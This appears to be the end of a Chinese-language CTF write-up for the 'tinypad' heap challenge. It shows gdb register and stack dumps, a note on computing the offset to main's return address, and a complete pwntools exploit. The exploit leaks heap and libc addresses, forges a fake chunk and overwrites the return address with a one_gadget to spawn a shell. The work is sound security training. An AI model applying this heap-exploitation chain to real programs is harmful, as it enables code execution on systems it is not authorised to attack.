       0x7f5fc75a0832     call   exit 
       0x7f5fc75a0837     xor    edx, edx
       0x7f5fc75a0839     jmp    __libc_start_main+57 
       0x7f5fc75a083e     mov    rax, qword ptr [rip + 0x3a8ecb] 
       0x7f5fc75a0845     ror    rax, 0x11
       0x7f5fc75a0849     xor    rax, qword ptr fs:[0x30]
       0x7f5fc75a0852     call   rax
       0x7f5fc75a0854     mov    rax, qword ptr [rip + 0x3a8ea5] 
       0x7f5fc75a085b     ror    rax, 0x11
    ──────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────
    00:0000│ rsp  0x7fff53d21e68 —▸ 0x7f5fc75a0830 (__libc_start_main+240) ◂— mov    edi, eax
    01:0008│      0x7fff53d21e70 ◂— 0x1
    02:0010│      0x7fff53d21e78 —▸ 0x7fff53d21f48 —▸ 0x7fff53d233b3 ◂— './tinypad'
    03:0018│      0x7fff53d21e80 ◂— 0x1c7b6fca0
    04:0020│      0x7fff53d21e88 —▸ 0x400863 (main) ◂— push   rbp
    05:0028│      0x7fff53d21e90 ◂— 0x0
    06:0030│      0x7fff53d21e98 ◂— 0x63cd5245d4e10d9c
    07:0038│      0x7fff53d21ea0 —▸ 0x4006e0 (_start) ◂— xor    ebp, ebp
    ────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
     ► f 0           400e68 main+1541
       f 1     7f5fc75a0830 __libc_start_main+24
为什么是libc_start_main?建议看看第三篇讲的linux x86程序启动  
给链接
[linux_x86程序启动中文版](https://luomuxiaoxiao.com/?p=516)  
[linux_x86程序启动英文版](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)
    84  ../sysdeps/unix/syscall-template.S: No such file or directory.
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    ─────────────────────────────────[ REGISTERS ]──────────────────────────────────
     RAX  0xfffffffffffffe00
     RBX  0x0
     RCX  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff
     RDX  0x1
     RDI  0x0
     RSI  0x7fff48b59964 ◂— 0x7b51190000000000
     R8   0x1
     R9   0x1999999999999999
     R10  0x0
     R11  0x246
     R12  0x4006e0 (_start) ◂— xor    ebp, ebp
     R13  0x7fff48b59a80 ◂— 0x1
     R14  0x0
     R15  0x0
     RBP  0x7fff48b59900 —▸ 0x7fff48b59950 —▸ 0x7fff48b59970 —▸ 0x7fff48b599a0 —▸ 0x401370 (__libc_csu_init) ◂— ...
     RSP  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax
     RIP  0x7f30af211260 (__read_nocancel+7) ◂— cmp    rax, -0xfff
    ───────────────────────────────────[ DISASM ]───────────────────────────────────
     ► 0x7f30af211260      cmp    rax, -0xfff
       0x7f30af211266     jae    read+73 
        ↓
       0x7f30af211299                mov    rcx, qword ptr [rip + 0x2ccbd8]
       0x7f30af2112a0                neg    eax
       0x7f30af2112a2                mov    dword ptr fs:[rcx], eax
       0x7f30af2112a5                or     rax, 0xffffffffffffffff
       0x7f30af2112a9                ret    
       0x7f30af2112aa                         nop    word ptr [rax + rax]
       0x7f30af2112b0                  cmp    dword ptr [rip + 0x2d2489], 0 
       0x7f30af2112b7                jne    write+25 
        ↓
       0x7f30af2112c9               sub    rsp, 8
    ───────────────────────────────────[ STACK ]────────────────────────────────────
    00:0000│ rsp  0x7fff48b598b8 —▸ 0x400ed9 (_read_n+112) ◂— mov    qword ptr [rbp - 0x10], rax
    01:0008│      0x7fff48b598c0 —▸ 0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* '(CMD)>>> ' */
    02:0010│      0x7fff48b598c8 ◂— 0x1
    03:0018│      0x7fff48b598d0 —▸ 0x7fff48b59964 ◂— 0x7b51190000000000
    04:0020│      0x7fff48b598d8 —▸ 0x400fad (_write_n+112) ◂— mov    qword ptr [rbp - 0x10], rax
    05:0028│      0x7fff48b598e0 —▸ 0x401a29 ◂— or     al, byte ptr [rax] /* '\n' */
    06:0030│      0x7fff48b598e8 ◂— 0x0
    07:0038│      0x7fff48b598f0 —▸ 0x4018d8 (prompt_cmd) ◂— sub    byte ptr [rbx + 0x4d], al /* '(CMD)>>> ' */
    ─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
     ► f 0     7f30af211260 __read_nocancel+7
       f 1           400ed9 _read_n+112
       f 2           401100 read_until+73
       f 3           400832 getcmd+92
       f 4           4009c1 main+350
       f 5     7f30af13a830 __libc_start_main+240
    gdb-peda$ find '0x7f30af13a830'
    Searching for '0x7f30af13a830' in: None ranges
    Found 1 results, display max 1 items:
    [stack] : 0x7fff48b599a8 --> 0x7f30af13a830 (:   mov    edi,eax)
    gdb-peda$ p 0x7fff48b599a8-0x7fff48b59a98
    $1 = 0xffffffffffffff10
    gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8
    $2 = 0xf0
这里说下怎么找偏移，  
从environ里leak出来的地址[+] main_ret: 0x7fff48b59a98，在与find出来的地址，find
的话，是find上面的f5那个地址，就是查找存了这个地址的位置，然后计算下偏移就行了
    gdb-peda$ p 0x7fff48b59a98-0x7fff48b599a8
    $2 = 0xf0
完结，撒花
### exp
    #!/usr/bin/env python
    # coding=utf-8
    from pwn import *
    elf = ELF('./tinypad')
    libc = elf.libc
    io = process('./tinypad')
    #context.log_level = 'debug'
    def choice(idx):
        io.sendlineafter("(CMD)>>> ", idx)
    def add(size, content):
        choice("A")
        io.sendlineafter("(SIZE)>>> ", str(size))
        io.sendlineafter("(CONTENT)>>> ", content)
    def remove(idx):
        choice("D")
        io.sendlineafter("(INDEX)>>> ", str(idx))
    def edit(idx, content):
        choice("E")
        io.sendlineafter("(INDEX)>>> ", str(idx))
        io.sendlineafter("(CONTENT)>>> ", content)
        io.sendlineafter("(Y/n)>>> ", "Y")
    def quit():
        choice("Q")
    def exp():
        #stage 1 leak the addr
        add(0x80, '1'*0x80)
        add(0x80, '2'*0x80)
        add(0x80, '3'*0x80)
        add(0x80, '4'*0x80)
        remove(3)
        remove(1)
        io.recvuntil("INDEX: 1\n")
        io.recvuntil(" # CONTENT: ")
        heap = u64(io.recvline().rstrip().ljust(8, '\x00')) - 0x120
        io.success("heap: 0x%x" % heap)
        io.recvuntil("INDEX: 3\n")
        io.recvuntil(" # CONTENT: ")
        leak_libc = u64(io.recvline().strip().ljust(8, '\x00')) - 88
        io.success("main_arena: 0x%x" %leak_libc)
        libc_base = leak_libc - 0x3c4b20
        remove(2)
        remove(4)
        #stage 2
        add(0x10, '1'*0x10)
        add(0x100, '2'*0xf8 + p64(0x11))
        add(0x100, '3'*0xf8)
        add(0x100, '4'*0xf8)
        tinypad = 0x0000000000602040
        offset = heap + 0x20 - (0x602040 + 0x20)
        io.success("offset: 0x%x" % offset)
        fake_chunk = p64(0) + p64(0x101) + p64(0x602060)*2
        edit(3, "4"*0x20 + fake_chunk)
        remove(1)
        add(0x18, '1'*0x10 + p64(offset))
        remove(2)
        #gdb.attach(io)
        edit(4, "4"*0x20 + p64(0) + p64(0x101) + p64(leak_libc + 88)*2)
        #stage 3
        one_gadget = libc_base + 0x45216
        io.success("libc_base: 0x%x" % libc_base)
        environ_pointer = libc_base + libc.symbols['__environ']
        io.success("environ_pointer: 0x%x" % environ_pointer)
        add(0xf0, '1'*0xd0 + p64(0x18) + p64(environ_pointer) + 'a'*8 + p64(0x602148))
        io.recvuntil(" #   INDEX: 1\n")
        io.recvuntil(" # CONTENT: ")
        main_ret = u64(io.recvline().rstrip().ljust(8, '\x00')) - 0x8 * 30
        io.success("main_ret: %x" % main_ret)
        edit(2, p64(main_ret))
        edit(1, p64(one_gadget))
        quit()
        gdb.attach(io)
    if __name__ == '__main__':
        exp()